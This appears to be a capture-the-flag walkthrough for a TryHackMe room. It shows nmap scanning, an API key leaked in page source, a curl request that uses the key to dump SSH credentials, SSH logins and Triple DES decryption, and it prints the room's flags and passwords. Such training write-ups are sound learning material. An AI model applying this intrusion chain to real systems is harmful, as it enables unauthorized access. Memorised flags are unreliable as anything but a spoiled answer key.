
<h1 align="center">MysteryBox Official Walkthrough</h1>

<h3 align="center">MysteryBox - Uncover the s3cr3ts</h3>


<p align="center">
Welcome to the MysteryBox, a thrilling and thought-provoking TryHackMe room designed to test your cybersecurity skills, problem-solving abilities, and creativity. This engaging challenge offers an opportunity to delve into a world of mysteries, puzzles, and secrets, where you'll uncover hidden treasures of knowledge and expertise. 
</p><br>
Expand your knowledge, and keep you engaged from start to finish.
<p align="center">
To embark on your MysteryBox adventure, simply navigate to the TryHackMe platform, search for "MysteryBox," and join the room. Once inside, follow the prompts, tackle the challenges, and enjoy the journey of discovery.
</p>

<h3><a href="https://tryhackme.com/room/mysterybox">MysteryBox</a> - <a href="https://tryhackme.com/room/mysterybox">https://tryhackme.com/room/mysterybox</a></h3>

<!-- ### [MysteryBox](https://tryhackme.com/room/mysterybox) - https://tryhackme.com/room/mysterybox -->

<br>

## Task 1

- Just join the room by clicking down the button and start the machine
- Connect your host machine to tryhackme through `Openvpn`, if you encountered any problem, visit [Reference Page](https://tryhackme.com/access)

- [x] Machine started successfully :tada:
- [x] Task 1 completed


<img src=https://justinmrp.github.io/Vagrant_Boxes/banner2.jpg align="center">


<br>

## Task 2

After getting machine ip, `nmap` it for any open ports 

```
nmap -sT -P <ip> -Pn
```


```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-06 12:37 IST
Nmap scan report for 192.168.56.45
Host is up (0.00087s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 21.20 seconds
```


Holy crap!...we have only one open port `ssh` But it requires `username` and `passwd` or `ssh-key` 


Ok...What about higher ports since `-P` checks only (0 - 1000), so use `-p-` for scan entire ports of the machine (0 - 65535)
<br>
```
nmap -sT -p- <ip> -Pn
```


```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-06 12:52 IST
Stats: 0:01:34 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Host is up (0.00085s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
7888/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 121.27 seconds
```

Uufff!...There is port open on `7888`, lets visit it in browser...
<br>
<img src= align="center">
<br>

Yup, we got 200 with a qr code it may be the next clue
scan it and see if any juicy available right there
<br>
<img src= align="center">
<br>
.....Holy sh*t ...."dumpy qrcode"
<br>

Let's see the source code of it
```
<!DOCTYPE html>
<html>
    <!-- this is very important page that it will let you to the next step of this box -->
<head>
    <title>Scan_me</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">    
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: black;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        #qrcode {
            max-width: 100%; 
            max-height: 100vh;
        }
    </style>
</head>
<body>
    <img id="qrcode" src="https://justinmrp.github.io/Vagrant_Boxes/data/service/qrcodeimp.png" alt="QR Code">
</body>

<!-- my_sup3r_s3cr3t_API_KEY="5Rj7D9sQxZ2cCpGnWvAeF6hT4yXwU8zK" -->
<!-- what_the_heck_is_this_key="f9324b5b0cf24736dcdfa4ed" -->


</html>
```

heheehhee....!..!..we got a juicy steak....<br>
<br>
Let's further explore that web page. Randomly checking if any other pages available in robots.txt and sitemap.xml....But coming up with a `api path` which can be located in robots.txt. 
Use can very well use `gobuster`, `dirsearch`, `ffuf` for finding this path....since methodology differs on people. 
<br>

```
curl http://<ip>:7888/api/users
```

its saying ```unauthorized```...Well now we can use the previously founded API key for authorization. So i ended up with adding custom header to the get request ```Authorization: 5Rj7D9sQxZ2cCpGnWvAeF6hT4yXwU8zK```

Curl command
```
curl http://<ip>:7888/api/users -H "Authorization: 5Rj7D9sQxZ2cCpGnWvAeF6hT4yXwU8zK"
```

API JSON response

```
{"ssh_user1": "cyberrav", "password1": "g0t_my_a1ms", "ssh_user2": "justin", "password2": "find_a_new_one!!"}
```
le me: getting wet in desert!!.....We got ssh username and password

<br>
you can very well use any interceptor like `Burp Suite`... for raising this modified request

Now just login into the ssh user
```
ssh cyberrav@<ip>
```
while listing out the contents in the folder, we got a png file
```
$ whoami
cyberrav
$ ls
us3r.png
$ pwd
/home/cyberrav
```

let's use `scp` for downloading this image file to our local machine
```
scp cyberrav@<ip>:/home/cyberrav/us3r.png <destination_path>
```
<br>
<img src= align="center">
<br>

<b>:\ d***</b> ...lets see if there  any interesting stuff in its meta data, So i have used `exiftool` to view it.

```
└─$ exiftool us3r.png 
ExifTool Version Number         : 12.65
File Name                       : us3r.png
Directory                       : .
File Size                       : 22 kB
File Modification Date/Time     : 2023:09:06 16:05:22+05:30
File Access Date/Time           : 2023:09:06 16:05:22+05:30
File Inode Change Date/Time     : 2023:09:06 16:05:22+05:30
File Permissions                : -rw-------
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 512
Image Height                    : 512
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Comment                         : THM{C4LL_M3_JU5T1N}
Image Size                      : 512x512
Megapixels                      : 0.262
```

ended up with the <b>user flag</b><br>

## 1.Use your skills to discover the User Flag hidden within the system
```
THM{C4LL_M3_JU5T1N}
```

<br><br>
Checking if we miss any files there!..yes we have hidden file named '.Flag2.txt' 

```
$ ls -a 
.  ..  .cache  .Flag2.txt  us3r.png
```

Do we get flag2 so quick!??..cat the content of this file....
we got some encrpted data...but what algo they used?
<br>
After checking for long time...! I thinks is triple DES encryption<br>
if may be? we need key to decrypt this....Hahhh....!...we have one right? which we got from source code of the webpage

<img src= align="center">

<br>

decrypted successfully using [Triple DES Decrypter](https://www.devglan.com/online-tools/triple-des-encrypt-decrypt)
we got our second user's password (justin)

<br>

Now ssh login to that account
```
ssh justin@<ip>
```

We grounded in root flag...

```
$ ls
get_the_flag
$ cd get_the_flag
$ ls
 r00t.txt 
$ cat r00t.txt	
cat: r00t.txt: No such file or directory
```

... :( something weird..!..let's cat everything in that folder

```
$ cat *
THM{M45T3R_3V3RYTH1NG}
```

Got it, yup our <b>root flag<b> is here
Submit the flag and complete the room!!
- [x] Task 2 Completed 

<br>

## 2.Locate the Root Flag
```
THM{M45T3R_3V3RYTH1NG}
```

<br><br>

<p align="center">Thanks for completing [MysteryBox](https://tryhackme.com/room/mysterybox)</p>